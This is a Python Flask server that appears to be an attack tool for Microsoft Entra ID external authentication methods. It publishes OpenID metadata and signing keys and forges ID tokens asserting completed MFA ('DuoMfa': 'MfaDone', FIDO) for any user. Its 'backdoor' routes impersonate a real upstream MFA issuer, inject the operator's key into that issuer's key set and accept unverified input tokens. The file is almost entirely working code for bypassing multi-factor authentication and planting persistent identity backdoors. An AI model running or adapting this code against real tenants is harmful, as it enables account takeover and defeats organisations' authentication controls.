from flask import Flask, render_template, render_template_string, session, request, redirect, url_for, abort, jsonify
from cryptography.hazmat.primitives import serialization, padding, hashes
from cryptography import x509
import base64
import requests
import time
import app_config
import jwt

app = Flask(__name__)
app.config.from_object(app_config)

from werkzeug.middleware.proxy_fix import ProxyFix
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)

@app.route("/.well-known/openid-configuration")
def oidc():
    data = {
      "token_endpoint": f"{app_config.ISSUER}/token",
      "token_endpoint_auth_methods_supported": [
        "client_secret_post",
        "private_key_jwt",
        "client_secret_basic"
      ],
      "jwks_uri": f"{app_config.ISSUER}/keys.json",
      "response_modes_supported": [
        "query",
        "fragment",
        "form_post"
      ],
      "subject_types_supported": [
        "pairwise"
      ],
      "id_token_signing_alg_values_supported": [
        "RS256"
      ],
      "response_types_supported": [
        "code",
        "id_token",
        "code id_token",
        "id_token token"
      ],
      "scopes_supported": [
        "openid",
        "profile",
        "email",
        "offline_access"
      ],
      "issuer": app_config.ISSUER,
      "request_uri_parameter_supported": False,
      "userinfo_endpoint": f"{app_config.ISSUER}/oidc/userinfo",
      "authorization_endpoint": f"{app_config.ISSUER}/authorize",
      "http_logout_supported": True,
      "frontchannel_logout_supported": True,
      "claims_supported": [
        "sub",
        "iss",
        "aud",
        "exp",
        "iat",
        "auth_time",
        "acr",
        "nonce",
        "name",
        "tid",
        "ver",
        "at_hash",
        "c_hash",
        "email"
      ]
    }
    return jsonify(data)

@app.route("/keys.json")
def servekeys():
    key = serialization.load_pem_private_key(app_config.PRIVKEY.encode('utf-8'), password=None)
    pubnumbers = key.public_key().public_numbers()

    cert = x509.load_pem_x509_certificate(app_config.CERT.encode('utf-8'))
    certder = cert.public_bytes(serialization.Encoding.DER)
    certbytes = base64.b64encode(certder)

    # From python docs https://docs.python.org/3/library/stdtypes.html#int.to_bytes
    exponent_as_bytes = pubnumbers.e.to_bytes((pubnumbers.e.bit_length() + 7) // 8, byteorder='big')
    modulus_as_bytes = pubnumbers.n.to_bytes((pubnumbers.n.bit_length() + 7) // 8, byteorder='big')
    jwks = {
        'keys': [{
            'kty': 'RSA',
            'use': 'sig',
            'e': base64.b64encode(exponent_as_bytes).decode('utf-8'),
            'n': base64.b64encode(modulus_as_bytes).decode('utf-8'),
            'alg': 'RS256',
            'kid': app_config.KEYID,
            'x5c': [certbytes.decode('utf-8')]
        }]
    }
    return jsonify(jwks)

@app.route("/eam/authorize", methods=['POST','GET'])
def eam_authorize():
    if not app_config.EAMENABLED:
        abort(404)
    tpl = '''
    <html><head><title>Working...</title></head><body>
<form method="POST" name="hiddenform" action="{{ redirurl }}">
<input type="hidden" name="token_type" value="Bearer" />
<input type="hidden" name="id_token" value="{{ id_token }}" />
<input type="hidden" name="expires_in" value="300" />
<input type="hidden" name="state" value="{{ state }}" />
<input type="hidden" name="scope" value="openid" /><noscript><p>Script is disabled. Click Submit to continue.</p>
<input type="submit" value="Submit" /></noscript></form><script language="javascript">function submit_form(){window.setTimeout('document.forms[0].submit()', 0);}window.onload=submit_form;</script></body></html>
    '''
    id_token_hint_unverified = request.form['id_token_hint']

    oidc_server = 'login.microsoftonline.com/common'
    oidc_config = requests.get(
        f"https://{oidc_server}/.well-known/openid-configuration"
    ).json()
    signing_algos = oidc_config["id_token_signing_alg_values_supported"]

    # Validate incoming ID token signature
    jwks_client = jwt.PyJWKClient(oidc_config["jwks_uri"])
    signing_key = jwks_client.get_signing_key_from_jwt(id_token_hint_unverified)
    id_token_hint = jwt.decode(
        id_token_hint_unverified,
        key=signing_key.key,
        algorithms=signing_algos,
        options={"verify_aud": False},
    )

    # Construct response
    payload = {
      "iss": f"{app_config.ISSUER}/eam",
      "sub": id_token_hint['sub'],
      "aud": request.form['client_id'],
      "exp": int(time.time())+300,
      "iat": int(time.time()),
      "nonce": request.form['nonce'],
      "DuoMfa": "MfaDone",
      "acr": "possessionorinherence",
      "amr": [
        "fido"
      ]
    }
    headers = {
        "kid": app_config.KEYID,
    }
    token = jwt.encode(payload, algorithm='RS256', key=app_config.PRIVKEY.encode('utf-8'), headers=headers)
    return render_template_string(tpl, redirurl=request.form['redirect_uri'], state=request.form['state'], id_token=token)

@app.route("/eam/.well-known/openid-configuration")
def eamoidc():
    data = {
      "token_endpoint": f"{app_config.ISSUER}/token",
      "token_endpoint_auth_methods_supported": [
        "client_secret_post",
        "private_key_jwt",
        "client_secret_basic"
      ],
      "jwks_uri": f"{app_config.ISSUER}/keys.json",
      "response_modes_supported": [
        "query",
        "fragment",
        "form_post"
      ],
      "subject_types_supported": [
        "pairwise"
      ],
      "id_token_signing_alg_values_supported": [
        "RS256"
      ],
      "response_types_supported": [
        "code",
        "id_token",
        "code id_token",
        "id_token token"
      ],
      "scopes_supported": [
        "openid",
        "profile",
        "email",
        "offline_access"
      ],
      "issuer": f"{app_config.ISSUER}/eam",
      "request_uri_parameter_supported": False,
      "userinfo_endpoint": f"{app_config.ISSUER}/oidc/userinfo",
      "authorization_endpoint": f"{app_config.ISSUER}/eam/authorize",
      "http_logout_supported": True,
      "frontchannel_logout_supported": True,
      "claims_supported": [
        "sub",
        "iss",
        "aud",
        "exp",
        "iat",
        "auth_time",
        "acr",
        "nonce",
        "name",
        "tid",
        "ver",
        "at_hash",
        "c_hash",
        "email"
      ]
    }
    return jsonify(data)

@app.route("/upstream/.well-known/openid-configuration")
def eambackdoor_oidc():
    if not app_config.BACKDOORENABLED:
        abort(404)
    data = {
      "token_endpoint": f"{app_config.REALISSUER}/token",
      "token_endpoint_auth_methods_supported": [
        "client_secret_post",
        "private_key_jwt",
        "client_secret_basic"
      ],
      "jwks_uri": f"{app_config.ISSUER}/upstream/keys",
      "response_modes_supported": [
        "form_post"
      ],
      "subject_types_supported": [
        "public",
        "pairwise"
      ],
      "id_token_signing_alg_values_supported": [
        "RS256"
      ],
      "response_types_supported": [
        "id_token",
      ],
      "scopes_supported": [
        "openid",
        "duo",
      ],
      "issuer": app_config.REALISSUER,
      "request_uri_parameter_supported": False,
      "userinfo_endpoint": f"{app_config.REALISSUER}/oidc/userinfo",
      "authorization_endpoint": f"{app_config.REALISSUER}/authorization",
      "device_authorization_endpoint": "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
      "http_logout_supported": True,
      "frontchannel_logout_supported": True,
      "end_session_endpoint": "https://login.microsoftonline.com/common/oauth2/v2.0/logout",
      "claims_supported": [
        "sub",
        "iss",
        "cloud_instance_name",
        "cloud_instance_host_name",
        "cloud_graph_host_name",
        "msgraph_host",
        "aud",
        "exp",
        "iat",
        "auth_time",
        "acr",
        "nonce",
        "preferred_username",
        "name",
        "tid",
        "ver",
        "at_hash",
        "c_hash",
        "email",
        "DuoMfa"
      ]
    }
    return jsonify(data)

@app.route("/upstream/keys")
def servebackdoorkeys():
    if not app_config.BACKDOORENABLED:
        abort(404)
    key = serialization.load_pem_private_key(app_config.PRIVKEY.encode('utf-8'), password=None)
    pubnumbers = key.public_key().public_numbers()
    realkeysres = requests.get(f'{app_config.REALISSUER}/jwks.json')
    realkeys = realkeysres.json()

    # Add our own keys
    cert = x509.load_pem_x509_certificate(app_config.CERT.encode('utf-8'))
    certder = cert.public_bytes(serialization.Encoding.DER)
    certbytes = base64.b64encode(certder)

    exponent_as_bytes = pubnumbers.e.to_bytes((pubnumbers.e.bit_length() + 7) // 8, byteorder='big')
    modulus_as_bytes = pubnumbers.n.to_bytes((pubnumbers.n.bit_length() + 7) // 8, byteorder='big')

    realkeys['keys'].append({
        'kty': 'RSA',
        'use': 'sig',
        'e': base64.b64encode(exponent_as_bytes).decode('utf-8'),
        'n': base64.b64encode(modulus_as_bytes).decode('utf-8'),
        'alg': 'RS256',
        'kid': app_config.KEYID,
        'x5c': [certbytes.decode('utf-8')]
    })
    return jsonify(realkeys)

@app.route("/upstream/authorize", methods=['POST','GET'])
def eambackdoor_authorize():
    if not app_config.BACKDOORENABLED:
        abort(404)
    tpl = '''
    <html><head><title>Working...</title></head><body>
<form method="POST" name="hiddenform" action="{{ redirurl }}">
<input type="hidden" name="token_type" value="Bearer" />
<input type="hidden" name="id_token" value="{{ id_token }}" />
<input type="hidden" name="expires_in" value="300" />
<input type="hidden" name="state" value="{{ state }}" />
<input type="hidden" name="scope" value="openid" /><noscript><p>Script is disabled. Click Submit to continue.</p>
<input type="submit" value="Submit" /></noscript></form><script language="javascript">function submit_form(){window.setTimeout('document.forms[0].submit()', 0);}window.onload=submit_form;</script></body></html>
    '''
    encoded = request.form['id_token_hint']
    id_token_hint = jwt.decode(encoded, options={"verify_signature": False})


    payload = {
        "iss": f"{app_config.REALISSUER}",
        "sub": id_token_hint['sub'],
        "aud": request.form['client_id'],
        "exp": int(time.time())+300,
        "iat": int(time.time()),
        "nonce": request.form['nonce'],
        "DuoMfa": "MfaDone",
        "acr": "possessionorinherence",
        "amr": [
            "fido"
        ]
    }
    headers = {
        "kid": app_config.KEYID,
    }
    token = jwt.encode(payload, algorithm='RS256', key=app_config.PRIVKEY.encode('utf-8'), headers=headers)
    return render_template_string(tpl, redirurl=request.form['redirect_uri'], state=request.form['state'], id_token=token)

if __name__ == "__main__":
    app.run()
